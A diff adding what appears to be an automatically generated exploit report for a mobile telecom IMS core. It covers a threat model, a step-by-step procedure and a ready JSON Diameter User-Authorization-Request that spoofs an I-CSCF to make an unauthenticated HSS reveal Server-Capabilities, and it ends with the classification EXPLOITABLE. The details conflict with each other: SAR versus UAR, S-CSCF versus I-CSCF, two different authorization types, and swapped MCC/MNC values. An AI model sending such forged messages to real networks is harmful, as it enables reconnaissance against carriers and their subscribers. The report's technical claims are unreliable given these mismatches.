@@ -1,0 +1,150 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - The victim is an **HSS** exposing the **Cx** interface to the Internet.
+  - The attacker can impersonate an **S-CSCF** and send a forged **Server-Assignment-Request (SAR)** to that HSS.
+  - No IPsec/TLS or peer authentication is enforced.
+  - The attacker knows the target subscriber's **Private User Identity** and can craft a protocol-plausible SAR for that user.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the HSS, send SAR requests, and receive SAA responses.
+  - The attacker cannot observe or alter traffic between the real S-CSCF and HSS.
+  - The attacker is not itself a functioning IMS serving node, but under the threat model it can still submit syntactically and semantically plausible S-CSCF-originated SARs.
+
+**Exploitability Analysis:**
+
+
+According to 3GPP Cx procedures (TS 29.228 / 29.229 semantics):
+- The **UAA** is sent by the **HSS** in response to a **UAR** from an I‑CSCF (or S‑CSCF).
+- In UAA, the grouped **Server-Capabilities** AVP may be included and contains, among others:
+  - **Mandatory-Capability** AVPs: numeric feature identifiers indicating capabilities that the serving S‑CSCF must support.
+  - Optional-Capability, Server-Name, etc.
+Thus, if the HSS accepts a UAR that triggers population of **Server-Capabilities**, the attacker will receive **Mandatory-Capability** values in the UAA.
+The `Mandatory-Capability` AVPs advertise internal capabilities of the S‑CSCF (and related IMS core) that are required for serving this user or for a particular service profile. Examples (conceptually):
+- Support for specific IMS/VoLTE features or 3GPP releases.
+- Support for certain charging, QoS, or security extensions.
+- Presence/absence of features such as specific header handling, routing behavior, or service triggers.
+While these AVPs are not subscriber-personal data, they are **sensitive from a network security perspective** because they:
+- Expose detailed **feature fingerprints** of core IMS elements (S‑CSCF types/versions/capabilities) that an external attacker should not normally see.
+- Help an attacker:
+  - Select or prioritize **protocol-level exploits** or malformed SIP/Diameter message patterns against specific implementations or features.
+  - Infer **software version families** or vendor‑specific functionality from the advertised capability codes.
+  - Tailor follow‑on attacks (e.g., bypassing weaker security options, targeting specific supplementary service implementations).
+Therefore, learning `Server-Capabilities.Mandatory-Capability` via an unauthenticated Internet‑reachable Diameter Cx interface is **security-relevant** and aids reconnaissance and targeted exploitation.
+
+**Attack Procedure:**
+
+1. **Attacker role & impersonation**
+   - The attacker impersonates the **I‑CSCF** using the provided attacker identity:
+     - `Origin-Host = icscf1.ims.system.com`
+     - `Origin-Realm = ims.system.com`
+
+2. **Victim node**
+   - The victim is the **HSS** Cx endpoint:
+     - `Destination-Host = hss.ims.system.com`
+     - `Destination-Realm = ims.system.com`
+
+3. **Establish Diameter connection**
+   - The attacker opens a TCP/SCTP connection to the HSS’s Diameter port and completes the ordinary Diameter capabilities exchange, spoofing the I‑CSCF identity.
+   - Due to misconfiguration (no TLS/IPsec, weak peer validation), the HSS accepts this peer as a trusted I‑CSCF.
+
+4. **Craft a single User-Authorization-Request (UAR)**
+   - **Command-Code:** 300 (UAR/UAA)
+   - **Application-Id:** use the provided `test_environment.diameter_common.application_id`:
+     - `16777251`
+   - **Flags:** Request (R) bit set; Proxiable (P) may also be set.
+   - **Key AVPs to include:**
+     - `Session-Id`: any unique string, e.g., `"icscf1.ims.system.com;1234567890"`.
+     - `Auth-Session-State`: `NO_STATE_MAINTAINED (1)` to keep it simple.
+     - `Origin-Host`: `icscf1.ims.system.com`
+     - `Origin-Realm`: `ims.system.com`
+     - `Destination-Realm`: `ims.system.com`
+     - `Destination-Host`: `hss.ims.system.com`
+     - `Vendor-Specific-Application-Id` containing:
+       - `Vendor-Id`: `10415` (3GPP)
+       - `Auth-Application-Id`: `16777251`
+     - `User-Name`: `460000123456001@ims.mnc000.mcc460.3gppnetwork.org`
+     - `Public-Identity`: `sip:460000123456001@ims.system.com`
+     - `Visited-Network-Identifier`: `mcc000.mnc460.3gppnetwork.org`
+     - `User-Authorization-Type`: `REGISTRATION (1)`
+   - Under normal HSS behavior, this UAR will cause the HSS to perform user authorization for the given IMS Public Identity and return a UAA including the S‑CSCF information and corresponding **Server-Capabilities** for this subscriber.
+
+5. **Receive and inspect the UAA**
+   - The attacker passively receives the single **User-Authorization-Answer (UAA)**.
+   - Inside the UAA, the attacker inspects:
+     - `Server-Capabilities` grouped AVP.
+       - Extracts all `Mandatory-Capability` AVPs and records their integer values.
+   - No further interaction is required; the attack succeeds within this one-shot exchange.
+
+**Attack Message:**
+
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "command_code": 300,
+    "application_id": 16777251,
+    "hop_by_hop_id": 123456789,
+    "end_to_end_id": 987654321,
+    "flags": ["R", "P"]
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "icscf1.ims.system.com;1234567890"
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "icscf1.ims.system.com"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "ims.system.com"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.system.com"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss.ims.system.com"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avps": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "460000123456001@ims.mnc000.mcc460.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:460000123456001@ims.system.com"
+    },
+    {
+      "avp_name": "Visited-Network-Identifier",
+      "avp_value": "mcc000.mnc460.3gppnetwork.org"
+    },
+    {
+      "avp_name": "User-Authorization-Type",
+      "avp_value": "REGISTRATION_AND_CAPABILITIES"
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
